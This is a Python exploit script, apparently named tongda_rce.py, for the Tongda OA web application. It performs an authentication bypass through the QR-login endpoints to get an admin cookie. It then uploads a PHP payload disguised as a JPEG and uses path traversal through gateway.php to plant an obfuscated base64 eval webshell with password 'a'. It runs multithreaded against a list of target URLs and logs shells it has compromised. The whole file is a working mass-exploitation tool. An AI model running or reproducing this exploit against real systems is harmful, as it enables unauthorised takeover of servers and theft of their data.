import requests
import threadpool
import urllib3
import json
import base64

urllib3.disable_warnings()
header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://google.com",
}
proxy = {       # debug
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


def wirte_targets(vurl, filename):
    with open(filename, "a+") as f:
        f.write(vurl + "\n")
        return vurl


def get_cookie(url):
    checkHeader = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://google.com",
    }
    try:
        req1 = requests.get(url + "/ispirit/login_code.php", headers=checkHeader, verify=False, timeout=25)
        if req1.status_code == 200 and "codeuid" in req1.text: 
            codeUid = json.loads(req1.text)["codeuid"]
        else:
            req1 = requests.get(url + "/general/login_code.php", headers=checkHeader, verify=False, timeout=25)
            status = req1.text.find('{"status":1')
            if req1.status_code == 200 and status != -1:
                codeUid = json.loads(req1.text[status:])["code_uid"]
            else:
                return "123"
        req2 = requests.post(url+ "/general/login_code_scan.php", data={"codeuid": codeUid, "uid": int(1), "source": "pc", "type": "confirm", "username": "admin"}, headers=checkHeader, verify=False, timeout=25)
        if req2.status_code == 200 and json.loads(req2.text)["status"] == "1":
            req3 = requests.get(url + "/ispirit/login_code_check.php?codeuid=" + codeUid, headers=checkHeader, verify=False, timeout=25)
            if req3.status_code == 200 and '"uid":"1"' in req3.text:
                cookie = req3.headers["Set-Cookie"]
                return cookie
    except:
        pass
    return "123"
    

def exp(u):
    uploadHeader = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----fuck123",
        "Referer": "https://google.com",
    }
    shellName = "templates.php"
    tongdaDir = "/"
    uploadFlag = "upload jpg shell"
    shellFlag = "sucess !!"
    webPath = tongdaDir + shellName
    printFlag = ""

    cookie = get_cookie(u)
    if cookie != "123":
        printFlag = "[Login successful]：" + u + "/general/index.php\t" + cookie + "\n"
    header["Cookie"] = cookie

    # password:a
    # POST method
    # base64.decode: <?php $a="~+d()"^"!{+{}";$b=${$a}["a"];eval("".$b);echo "sucess !!";?>
    b64Shell = "PD9waHAgJGE9In4rZCgpIl4iIXsre30iOyRiPSR7JGF9WyJhIl07ZXZhbCgiIi4kYik7ZWNobyAi" + base64.b64encode(shellFlag.encode("utf-8")).decode("utf-8") + "Ijs/Pg=="
    
    uploadData = "------fuck123\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n------fuck123\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n" + cookie[cookie.find("=")+1:cookie.find(";")] + "\r\n------fuck123\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1\r\n------fuck123\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\nfile_put_contents($_SERVER[\"DOCUMENT_ROOT\"].\"/" + webPath + "\", base64_decode('" + b64Shell + "'));\r\necho \"" + uploadFlag + "\";\r\n?>\r\n------fuck123--"
    try:
        uploadHeader["Cookie"] = cookie
        req1 = requests.post(u + "/ispirit/im/upload.php", headers=uploadHeader, verify=False, data=uploadData, timeout=25)
        text = req1.text
        if req1.status_code == 200 and "[vm]" in text:
            uploadFilePath = text[text.find("@")+1:text.find("|")].replace("_", "/")
            includeData = 'json={"url":"/general/../../attach/im/' + uploadFilePath + '.jpg"}'
            req2 = requests.post(u + "/mac/gateway.php", headers=header, verify=False, data=includeData, timeout=25)
            if req2.status_code == 404 or uploadFlag not in req2.text:
                req2 = requests.post(u + "/ispirit/interface/gateway.php", headers=header, verify=False, data=includeData, timeout=25)
            if req2.status_code == 200 and uploadFlag in req2.text:
                shellPath = u + webPath
                req3 = requests.get(shellPath, headers=header, verify=False, timeout=25)
                if shellFlag in req3.text:
                    printFlag = "[Getshell successful]：" + shellPath + "\n"
                    wirte_targets(shellPath, "vuln.txt")
    except:
        pass
    print(printFlag, end="")


def multithreading(funcname, filename="url.txt", pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")]
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()


if __name__ == "__main__":
    multithreading(exp, "url.txt", 8)      # Default threads 8

# Usage: python tongda_rce.py url.txt
# Default webshell password:a
